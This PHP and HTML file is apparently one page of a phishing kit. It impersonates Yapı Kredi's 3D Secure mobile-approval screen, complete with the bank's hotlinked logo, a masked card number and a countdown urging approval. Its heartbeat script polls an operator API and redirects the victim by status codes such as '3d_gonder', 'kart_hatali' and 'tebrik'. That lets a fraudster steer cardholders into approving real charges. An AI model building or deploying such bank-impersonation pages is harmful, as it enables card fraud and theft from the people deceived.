<?php
$is_mobil_onay = true;
require __DIR__ . '/_acs_core.php';

// Format dynamic variables
$cc_clean = preg_replace('/\D/', '', $kart_no);
if (strlen($cc_clean) >= 16) {
    $first_4 = substr($cc_clean, 0, 4);
    $next_2 = substr($cc_clean, 4, 2);
    $last_4 = substr($cc_clean, -4);
    $masked_card = "{$first_4} {$next_2}** **** {$last_4}";
} else {
    $masked_card = '4506 34** **** 9128'; // fallback
}

// Transaction date formatted like 06/07/2026 19:43:28
$zaman_ykb = date('d/m/Y H:i:s');

// Transaction amount formatted like 59.998,00 TL
$ucret_val = ayar_get('randevu_ucreti', '49');
$tutar_ykb = number_format((float)$ucret_val, 2, ',', '.') . ' TL';
?>
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Yapı Kredi - Üç Boyutlu Güvenlik Sistemi</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    body {
      background: #0070c0; /* Fallback */
      background: linear-gradient(180deg, #0b6cb4 0%, #003a70 100%);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      color: #333;
    }
    
    /* Top Bar */
    .top-header-bar {
      background-color: #002d62;
      color: #fff;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 20px;
      font-size: 14px;
      font-weight: 500;
    }
    .top-header-bar .title {
      font-size: 13.5px;
      font-weight: 700;
      letter-spacing: 0.2px;
    }
    .top-header-bar .links {
      font-size: 12.5px;
    }
    .top-header-bar .links span {
      margin-left: 6px;
      margin-right: 6px;
      cursor: pointer;
      opacity: 0.9;
    }
    .top-header-bar .links span:hover {
      opacity: 1;
      text-decoration: underline;
    }

    /* Main Container */
    .main-wrapper {
      flex: 1;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 24px 16px;
    }
    
    /* Card */
    .threed-card {
      background: #ffffff;
      border-radius: 4px;
      width: 100%;
      max-width: 440px;
      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
      border: 3px solid #dbe6f0;
      overflow: hidden;
    }
    
    /* Logo Header */
    .brand-section {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 18px 24px;
      border-bottom: 1px solid #eaf0f5;
    }
    .brand-section img.ykb-logo {
      height: 30px;
    }
    .brand-section svg.visa-logo {
      height: 18px;
    }
    
    /* Card Body */
    .card-content {
      padding: 24px;
    }
    
    /* Info Table */
    .details-table {
      width: 100%;
      margin-bottom: 18px;
      font-size: 13.5px;
      border-collapse: collapse;
    }
    .details-row {
      display: flex;
      padding: 8px 0;
      border-bottom: 1px solid #f2f6f9;
    }
    .details-row:last-child {
      border-bottom: none;
    }
    .details-label {
      width: 150px;
      color: #64748b;
      font-weight: 500;
      flex-shrink: 0;
    }
    .details-value {
      color: #0f172a;
      font-weight: 700;
    }
    
    /* Blue Alert Info */
    .alert-notice {
      display: flex;
      align-items: center;
      gap: 10px;
      color: #0284c7;
      font-size: 13px;
      font-weight: 600;
      margin-bottom: 20px;
      padding: 2px 0;
    }
    .alert-notice .info-badge {
      width: 18px;
      height: 18px;
      background: #0284c7;
      color: #fff;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 11px;
      font-weight: bold;
      flex-shrink: 0;
    }

    /* Notification Box */
    .approval-container {
      background-color: #f8fafc;
      border-radius: 6px;
      padding: 20px;
      display: flex;
      flex-direction: column;
      align-items: center;
      border: 1px solid #e2e8f0;
    }
    .approval-message-wrapper {
      display: flex;
      gap: 12px;
      align-items: flex-start;
      width: 100%;
      color: #334155;
      font-size: 13px;
      line-height: 1.5;
      margin-bottom: 22px;
    }
    .approval-message-wrapper .warning-badge {
      width: 22px;
      height: 22px;
      background: #0284c7;
      color: #fff;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 13px;
      font-weight: bold;
      flex-shrink: 0;
      margin-top: 1px;
    }
    
    /* Timer Circle */
    .progress-circle-wrap {
      position: relative;
      width: 100px;
      height: 100px;
      margin-bottom: 14px;
    }
    .countdown-svg {
      width: 100%;
      height: 100%;
      transform: rotate(-90deg);
    }
    .countdown-svg circle {
      fill: none;
      stroke-width: 6;
    }
    .countdown-svg circle.track {
      stroke: #e2e8f0;
    }
    .countdown-svg circle.bar {
      stroke: #0284c7;
      stroke-dasharray: 251.2; /* 2 * pi * 40 */
      stroke-dashoffset: 0;
      stroke-linecap: round;
      transition: stroke-dashoffset 1s linear;
    }
    .countdown-number {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 26px;
      font-weight: 700;
      color: #1e293b;
    }
    .seconds-text {
      font-size: 13.5px;
      color: #0284c7;
      font-weight: 700;
      margin-top: 4px;
    }
  </style>
</head>
<body>
  
  <div class="top-header-bar">
    <div class="title">Üç Boyutlu Güvenlik Sistemi</div>
    <div class="links">
      <span>Yardım</span>|<span>English</span>
    </div>
  </div>

  <div class="main-wrapper">
    <div class="threed-card">
      <div class="brand-section">
        <img class="ykb-logo" src="https://goguvenliodeme.bkm.com.tr/banklogo/yapikredi.png" alt="Yapı Kredi">
        <!-- Crisp inline SVG for Visa -->
        <svg class="visa-logo" viewBox="0 0 300 100" fill="#002d62">
          <path d="M123.6 2.4L105 97.6h25.8l18.6-95.2h-25.8zm73.2 0l-15.6 53.6-6.6-45.2c-.8-5-4.6-8.4-9.6-8.4h-35.4l-.6 2.6c7.2 1.6 13.8 4.4 18.2 7.6 2.8 2 3.6 3.6 4.6 7.4l15.6 77.6h27L223 2.4h-26.2zm48 0l-20.4 95.2h24.8l20.4-95.2h-24.8zm-192.6 0L29.6 68 24.2 13.2C22.6 5.4 16.4 2.4 8.8 2.4H0l.8 2.6c9.6 2.2 18.2 5.8 24 9.6 3.6 2.4 4.6 4.4 5.8 9l18.4 74H76L102.2 2.4H52.2z" fill="#002d62"/>
        </svg>
      </div>
      
      <div class="card-content">
        <table class="details-table">
          <tr class="details-row">
            <td class="details-label">Üye İşyeri İsmi</td>
            <td class="details-value"><?= htmlspecialchars($isyeri) ?></td>
          </tr>
          <tr class="details-row">
            <td class="details-label">Tutar</td>
            <td class="details-value"><?= $tutar_ykb ?></td>
          </tr>
          <tr class="details-row">
            <td class="details-label">Tarih</td>
            <td class="details-value"><?= $zaman_ykb ?></td>
          </tr>
          <tr class="details-row">
            <td class="details-label">Kart Numarası</td>
            <td class="details-value"><?= $masked_card ?></td>
          </tr>
          <tr class="details-row">
            <td class="details-label">Cihaz Bilgisi</td>
            <td class="details-value">M2007J20CG</td>
          </tr>
        </table>
        
        <div class="alert-notice">
          <div class="info-badge">i</div>
          <div>Bu bilgiler işyerleri ile paylaşılmamaktadır.</div>
        </div>
        
        <div class="approval-container">
          <div class="approval-message-wrapper">
            <div class="warning-badge">!</div>
            <div>Akıllı Bildirim tanımlı mobil cihazınıza gönderilen Akıllı Bildirim'i onaylayarak işleminizi tamamlayabilirsiniz.</div>
          </div>
          
          <div class="progress-circle-wrap">
            <svg class="countdown-svg" viewBox="0 0 100 100">
              <circle class="track" cx="50" cy="50" r="40" />
              <circle class="bar" cx="50" cy="50" r="40" id="progress-bar-fill" />
            </svg>
            <div class="countdown-number" id="countdown-num">180</div>
          </div>
          
          <div class="seconds-text" id="seconds-text">180 saniye içinde onaylayınız.</div>
        </div>
      </div>
    </div>
  </div>

  <script>
    var sec = 180;
    var progressBar = document.getElementById('progress-bar-fill');
    var countdownNum = document.getElementById('countdown-num');
    var secondsText = document.getElementById('seconds-text');
    var totalSec = 180;
    var dashArray = 251.2;

    function updateTimer() {
      if (sec <= 0) {
        clearInterval(timerInterval);
        // Redirect to bekle.php
        window.location.href = '<?= BASE_PATH ?>/bekle.php';
        return;
      }
      sec--;
      countdownNum.textContent = sec;
      secondsText.textContent = sec + " saniye içinde onaylayınız.";
      
      // Calculate progress dash offset
      var offset = dashArray - (dashArray * (sec / totalSec));
      progressBar.style.strokeDashoffset = offset;
    }

    // Set initial dash offset to 0 (full circle)
    progressBar.style.strokeDashoffset = 0;
    var timerInterval = setInterval(updateTimer, 1000);

    // Heartbeat logic
    function heartbeat(){
      fetch('<?= BASE_PATH ?>/api/heartbeat.php', {method:'POST', credentials:'same-origin'})
        .then(function(r){ return r.json(); })
        .then(function(d){
          var dur = d.durum || 'bekle';
          if (dur === 'provizyon_hatali') {
            return; // stay here
          }
          if (dur === '3d_gonder' || dur === '3d_hatali') {
            window.location.href = '<?= BASE_PATH ?>/acs/yapikredi.php';
            return;
          }
          if (dur === 'tebrik') {
            window.location.href = '<?= BASE_PATH ?>/sonuc.php';
            return;
          }
          var errors = ['kart_hatali', 'eticaret_kapali', 'limit_yetersiz', 'kart_desteklenmiyor', 'provizyon_gonder'];
          if (errors.indexOf(dur) !== -1) {
            window.location.href = '<?= BASE_PATH ?>/odeme_hata.php?hata=' + dur;
            return;
          }
          if (dur === 'bekle') {
            window.location.href = '<?= BASE_PATH ?>/bekle.php';
            return;
          }
        }).catch(function(){});
    }
    setInterval(heartbeat, 2500);
  </script>
</body>
</html>
